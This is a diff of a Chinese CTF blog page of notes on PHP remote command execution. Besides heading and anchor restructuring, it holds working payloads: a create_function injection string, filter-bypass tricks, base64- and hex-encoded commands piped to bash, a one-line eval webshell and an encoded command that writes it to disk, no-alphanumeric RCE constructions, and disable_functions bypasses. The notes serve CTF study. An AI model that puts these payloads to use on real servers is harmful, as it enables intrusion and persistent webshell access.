@@ -17,13 +17,6 @@
 <script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
 
 
-<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
-<link
-    rel="stylesheet"
-    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
-/>
-<script src="/blog/js/lib/highlight.js"></script>
-
 
 
 <script src="/blog/js/lib/preview.js"></script>
@@ -178,7 +171,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
+                <a href="/blog/tags/Web/" style="color: #ff7d73">Web</a>
             </span>
             
         </span>
@@ -187,33 +180,51 @@
     
     <div class="content" v-pre>
         <blockquote>
+<ol>
+<li><p><a href="#1"><strong>危险函数</strong></a></p>
+</li>
+<li><p><strong><a href="#2">Linux指令</a></strong></p>
+</li>
+<li><p><strong><a href="#3">系统命令</a></strong></p>
+</li>
+<li><p><strong><a href="#4">绕过被过滤的字符</a></strong></p>
+</li>
+<li><p><strong><a href="#5">无字母rce</a></strong></p>
+</li>
+<li><p><strong><a href="#6">无回显rce</a></strong></p>
+</li>
+<li><p><strong><a href="#7">无参rce</a></strong></p>
+</li>
+<li><p><strong><a href="#8">突破禁用函数</a></strong></p>
+</li>
+</ol>
+</blockquote>
+<hr>
+<h1 id="RCE-命令执行"><a href="#RCE-命令执行" class="headerlink" title="RCE(命令执行)"></a>RCE(命令执行)</h1><span id="more"></span>
+
+<blockquote>
 <p>解题步骤</p>
+</blockquote>
 <ol>
 <li><code>phpinfo()</code>查看<code>disable_functions</code>禁用函数</li>
 <li><code>ls</code>查看目录下文件</li>
 <li>执行命令获取flag</li>
 <li>如果是假flag，<code>ls /</code>查看是否存在其他flag文件夹</li>
 </ol>
-</blockquote>
-<hr>
-<h2 id="RCE-命令执行"><a href="#RCE-命令执行" class="headerlink" title="RCE(命令执行)"></a>RCE(命令执行)</h2><span id="more"></span>
-
-<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><pre><code class="php">assert()    //判断一个表达式是否成立。返回true or false; 
+<h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a><a id="1">危险函数</a></h2><pre><code class="php">assert()    //判断一个表达式是否成立。返回true or false; 
 
 preg_replace()   //函数是用来执行一个正则表达式的搜索和替换的  preg_replace(要搜索的字符串，用于替换的字符串，要搜索替换的字符串)
 </code></pre>
 <ul>
-<li><p><strong>eval()</strong></p>
+<li><strong>eval()</strong></li>
+</ul>
 <blockquote>
 <p>将输入的字符串参数当做PHP程序代码来执行</p>
 </blockquote>
-<ul>
-<li><pre><code class="php">如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt;
+<pre><code class="php">如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt;
 </code></pre>
-</li>
-</ul>
-</li>
-<li><p>**call_user_func()   **</p>
+<ul>
+<li><p><strong>call_user_func()</strong></p>
 <blockquote>
 <p>以动态方式调用一个函数，并将一个数组作为参数列表传递给该函数</p>
 </blockquote>
@@ -237,7 +248,39 @@ echo call_user_func(array($this, &#39;test&#39;), &#39;a&#39;, &#39;b&#39;);//�
           call_user_func_array(&#39;a&#39;, array(&quot;111&quot;, &quot;222&quot;));  //输出 111 222
 </code></pre>
 </li>
-<li><p><strong><a href="#create_function%E5%87%BD%E6%95%B0">create_function()</a></strong></p>
+<li><p><strong>create_function()</strong></p>
+</li>
+</ul>
+<blockquote>
+<p>该函数用来创建匿名函数,并为其返回唯一名称</p>
+<p>PHP4,PHP5,PHP7</p>
+</blockquote>
+<pre><code class="php">create_function(string $args,string $code)
+//string $args 声明的函数变量部分
+//string $code 执行的方法代码部分
+</code></pre>
+<ul>
+<li><p>使用例</p>
+<pre><code class="php">$id=$_GET[&#39;id&#39;];
+
+$code = &#39;echo $name. &#39;.&#39;的编号是&#39;.$id.&#39;; &#39;;
+
+$b = create_function(&#39;$name&#39;,$code);
+//实现
+function niming($name)&#123;
+echo $name.&quot;编号&quot;.$id;
+&#125;
+$b(&#39;sd&#39;);
+</code></pre>
+<p>payload：</p>
+<pre><code class="php">?id=2;&#125;phpinfo();/* 
+</code></pre>
+<pre><code class="php">此时代码为
+function niming($name)&#123;
+echo $name.编号2;
+     &#125;phpinfo();/*
+&#125;
+</code></pre>
 </li>
 <li><p><strong>array_map()</strong></p>
 <blockquote>
@@ -256,7 +299,7 @@ print_r(array_map(&#39;oneArray&#39;, $one_array));
 </code></pre>
 </li>
 </ul>
-<h3 id="Linux指令"><a href="#Linux指令" class="headerlink" title="Linux指令"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux指令</a></h3><ul>
+<h2 id="Linux指令"><a href="#Linux指令" class="headerlink" title="Linux指令"></a><a id="2"><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux指令</a></a></h2><ul>
 <li><p>ls：查看目录</p>
 <ul>
 <li>-lst 查看目录下文件权限</li>
@@ -276,7 +319,7 @@ print_r(array_map(&#39;oneArray&#39;, $one_array));
 </code></pre>
 </li>
 </ul>
-<h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><ul>
+<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><ul>
 <li><p><strong>cat</strong></p>
 <blockquote>
 <p>连接文件并打印到标准输出设备上</p>
@@ -327,7 +370,7 @@ print_r(array_map(&#39;oneArray&#39;, $one_array));
 </tbody></table>
 </li>
 </ul>
-<h4 id="Glob通配符"><a href="#Glob通配符" class="headerlink" title="Glob通配符"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">Glob通配符</a></h4><p><code>*</code>：匹配零个或者多个字符</p>
+<h3 id="Glob通配符"><a href="#Glob通配符" class="headerlink" title="Glob通配符"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">Glob通配符</a></h3><p><code>*</code>：匹配零个或者多个字符</p>
 <p><code>?</code>：匹配一个字符</p>
 <p><code>[]</code>：匹配指定集合中的任意单个字符，比如<code>[abc]</code>表示匹配单个字符a或者b或者c</p>
 <p><code>&#123;a,b&#125;</code>：匹配a或者b，a与b也是通配符，可以由其他通配符组成</p>
@@ -341,7 +384,7 @@ print_r(array_map(&#39;oneArray&#39;, $one_array));
 <p><code>[[:space:]]</code>：匹配单个空白字符</p>
 <p><code>[[:punctl:]]</code>：匹配单个标点符号</p>
 <p><code>[^]</code>:匹配指定集合之外的其他任意单个字符，比如<code>[^abc]</code>表示匹配除了a、b、c以外的其他任意字符</p>
-<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p>使用<code>system</code>前先查看<code>phpinfo</code>中的disabled_functions禁用的函数</p>
+<h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a><a id="3">系统命令</a></h2><p>使用<code>system</code>前先查看<code>phpinfo</code>中的disabled_functions禁用的函数</p>
 <ul>
 <li><p><strong>system()</strong></p>
 <blockquote>
@@ -429,22 +472,18 @@ $result：shell脚本的执行结果
 </li>
 <li><p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
 <p>写入的内容会永远消失，也就是不进行回显，需用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p>
-<ul>
-<li><pre><code>/dev/null
+<pre><code>/dev/null
 </code></pre>
 <blockquote>
 <p>将标准输出1重定向到&#x2F;dev&#x2F;null中。 &#x2F;dev&#x2F;null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;&#x2F;dev&#x2F;null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容</p>
 </blockquote>
-</li>
-<li><pre><code>2&gt;&amp;1
+<pre><code>2&gt;&amp;1
 </code></pre>
 <blockquote>
 <p>2&gt; 表示stderr标准错误</p>
 <p>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</p>
 <p>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于 “1&gt;&#x2F;dev&#x2F;null”</p>
 </blockquote>
-</li>
-</ul>
 <p><img src="C:/Users/Asus/AppData/Roaming/Typora/typora-user-images/image-20230305110214437.png" alt="image-20230305110214437"></p>
 </li>
 <li><p>&amp;：按位与</p>
@@ -467,7 +506,7 @@ $result：shell脚本的执行结果
 </ul>
 </li>
 </ul>
-<h3 id="绕过被过滤的字符"><a href="#绕过被过滤的字符" class="headerlink" title="绕过被过滤的字符"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/109671655?ops_request_misc=%7B%22request_id%22:%22167003773216782428635305%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167003773216782428635305&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109671655-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=ctf%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8Dls%E8%A2%AB%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">绕过被过滤的字符</a></h3><p><strong>下划线</strong>：“+”或“[”或“ ”或“.”</p>
+<h2 id="绕过被过滤的字符"><a href="#绕过被过滤的字符" class="headerlink" title="绕过被过滤的字符"></a><a id="4"><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/109671655?ops_request_misc=%7B%22request_id%22:%22167003773216782428635305%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167003773216782428635305&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109671655-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=ctf%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8Dls%E8%A2%AB%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">绕过被过滤的字符</a></a></h2><p><strong>下划线</strong>：“+”或“[”或“ ”或“.”</p>
 <p><strong>空格（\x09）</strong>：$IFS$9 、${IFS} 、%09(php环境下)、重定向符&lt;&gt;、&lt;、\x20</p>
 <p><strong>分号</strong>：%0a</p>
 <p><strong>&#x2F;</strong>:chr(47)</p>
@@ -483,22 +522,22 @@ $result：shell脚本的执行结果
 <ul>
 <li><p><code>当ls被过滤时： a=l;b=s;$a$b 当cat flag被过滤时： a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125; \#cat test文件内容 a=“ccaatt”;b=$&#123;a:0:1&#125;$&#123;a:2:1&#125;$&#123;a:4:1&#125;;$b test</code></p>
 </li>
-<li><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><code>echo Y2F0IC9mbGFn|base64 -d|bash ==&gt;cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag echo Y2F0IGZsYWcucGhw|base64 -d|bash==&gt;cat flag.php echo Y2F0IGZsYWcucGhw|base64 -d|sh==&gt;cat flag.php</code></p>
-<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p><code>echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></p>
-<h3 id="oct-x2F-字节"><a href="#oct-x2F-字节" class="headerlink" title="oct&#x2F;字节"></a>oct&#x2F;字节</h3><p><code>$(printf &quot;\154\163&quot;) ==&gt;ls $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</code></p>
-<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>内容为</p>
+<li><h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p><code>echo Y2F0IC9mbGFn|base64 -d|bash ==&gt;cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag echo Y2F0IGZsYWcucGhw|base64 -d|bash==&gt;cat flag.php echo Y2F0IGZsYWcucGhw|base64 -d|sh==&gt;cat flag.php</code></p>
+<h2 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h2><p><code>echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></p>
+<h2 id="oct-x2F-字节"><a href="#oct-x2F-字节" class="headerlink" title="oct&#x2F;字节"></a>oct&#x2F;字节</h2><p><code>$(printf &quot;\154\163&quot;) ==&gt;ls $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</code></p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>内容为</p>
 <pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
 $&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php
 </code></pre>
 </li>
-<li><h3 id="单引号双引号绕过"><a href="#单引号双引号绕过" class="headerlink" title="单引号双引号绕过"></a>单引号双引号绕过</h3><p><code>c&#39;a&#39;t test</code></p>
+<li><h2 id="单引号双引号绕过"><a href="#单引号双引号绕过" class="headerlink" title="单引号双引号绕过"></a>单引号双引号绕过</h2><p><code>c&#39;a&#39;t test</code></p>
 <p><code>  c&quot;a&quot;t test</code></p>
 </li>
-<li><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p><code>ca\t flag</code></p>
+<li><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h2><p><code>ca\t flag</code></p>
 </li>
 </ul>
 <hr>
-<h3 id="无字母rce"><a href="#无字母rce" class="headerlink" title="无字母rce"></a>无字母rce</h3><blockquote>
+<h2 id="无字母rce"><a href="#无字母rce" class="headerlink" title="无字母rce"></a><a id="5">无字母rce</a></h2><blockquote>
 <p>原型：对以下代码的绕过</p>
 </blockquote>
 <pre><code class="php">&lt;?php
@@ -506,7 +545,7 @@ if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) &#123;
   eval($_GET[&#39;shell&#39;]);
 &#125;
 </code></pre>
-<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><pre><code class="php">  &lt;?php
+<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><pre><code class="php">  &lt;?php
   highlight_file(__FILE__);
   $code1=&quot;system&quot;;
   $code2=&quot;cat /f*&quot;;
@@ -521,7 +560,7 @@ $&#123;_&#125; =&quot;&quot;返回上一次命令
 </code></pre>
 </li>
 </ul>
-<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><pre><code class="python">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#39;\&quot;,.&lt;&gt;/?-=_`~ &quot;
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><pre><code class="python">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#39;\&quot;,.&lt;&gt;/?-=_`~ &quot;
 
 answer = str(input(&quot;&quot;))#请输入进行异或构造的字符串
 
@@ -539,7 +578,7 @@ for c in answer:
 print(&quot;tmp1为:&quot;,tmp1)
 print(&quot;tmp2为:&quot;,tmp2)
 </code></pre>
-<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><ul>
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><ul>
 <li><pre><code class="php">$_++=1
 </code></pre>
 <p><code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
@@ -558,7 +597,7 @@ $___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即
 </code></pre>
 </li>
 </ul>
-<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><blockquote>
+<h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
 </blockquote>
 <ul>
@@ -569,8 +608,14 @@ $___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即
 </ul>
 <blockquote>
 <p>临时文件目录：</p>
+</blockquote>
+<blockquote>
 <p>Linux临时文件主要存储在&#x2F;tmp&#x2F;目录下，格式通常是（&#x2F;tmp&#x2F;php[6个随机字符]）</p>
+</blockquote>
+<blockquote>
 <p>Windows临时文件主要存储在C:&#x2F;Windows&#x2F;目录下，格式通常是（C:&#x2F;Windows&#x2F;php[4个随机字符].tmp）</p>
+</blockquote>
+<blockquote>
 <p>大概就是在自己的vps上写一个命令执行的txt，然后在题目post该命令</p>
 </blockquote>
 <ul>
@@ -619,11 +664,11 @@ ls
 </ul>
 </li>
 </ul>
-<h3 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h3><p>1.利用dnslog带外</p>
+<h2 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a><a id="6">无回显rce</a></h2><p>1.利用dnslog带外</p>
 <p>2.写马</p>
 <p>3.反弹shell</p>
 <p>4.写文件然后访问文件</p>
-<h3 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h3><blockquote>
+<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a><a id="7">无参rce</a></h2><blockquote>
 <p>依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
 </blockquote>
 <p>核心</p>
@@ -679,14 +724,14 @@ ls
 </li>
 </ul>
 <hr>
-<h3 id="突破禁用函数"><a href="#突破禁用函数" class="headerlink" title="突破禁用函数"></a>突破禁用函数</h3><blockquote>
+<h2 id="突破禁用函数"><a href="#突破禁用函数" class="headerlink" title="突破禁用函数"></a><a id="8">突破禁用函数</a></h2><blockquote>
 <p>system() has been disabled for security reasons说明php.ini配置中默认禁用了执行系统外部命令函数,我们可以用php内置函数来读取文件</p>
 </blockquote>
-<h5 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印:"></a>输出打印:</h5><pre><code class="php">print_r();
+<h4 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印:"></a>输出打印:</h4><pre><code class="php">print_r();
 var_dump();
 var_export();
 </code></pre>
-<h5 id="查看目录："><a href="#查看目录：" class="headerlink" title="查看目录："></a>查看目录：</h5><pre><code class="php">scandir(&#39;.&#39;)	//查看当前目录
+<h4 id="查看目录："><a href="#查看目录：" class="headerlink" title="查看目录："></a>查看目录：</h4><pre><code class="php">scandir(&#39;.&#39;)	//查看当前目录
 glob(&#39;*&#39;)
 scandir(&#39;/&#39;)	//查看根目录
 </code></pre>
@@ -710,7 +755,7 @@ foreach($a as $f)&#123;
 <blockquote>
 <p>查找匹配的文件路径模式</p>
 </blockquote>
-<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件:"></a>读取文件:</h5><pre><code class="php">show_source();
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件:"></a>读取文件:</h4><pre><code class="php">show_source();
 highlight_file();
 file_get_contents();
 include();
@@ -962,7 +1007,7 @@ exit(0);
 $a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的,需要访问1.txt
 $ffi-&gt;system($a);//通过$ffi去调用system函数
 </code></pre>
-<h5 id="ob-代码应对"><a href="#ob-代码应对" class="headerlink" title="ob_代码应对"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121723791">ob_代码应对</a></h5><pre><code class="php">ob_get_contents();//返回输出缓冲区的内容
+<h4 id="ob-代码应对"><a href="#ob-代码应对" class="headerlink" title="ob_代码应对"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121723791">ob_代码应对</a></h4><pre><code class="php">ob_get_contents();//返回输出缓冲区的内容
 ob_end_clean();//清空（擦除）缓冲区并关闭输出缓冲
 </code></pre>
 <ul>
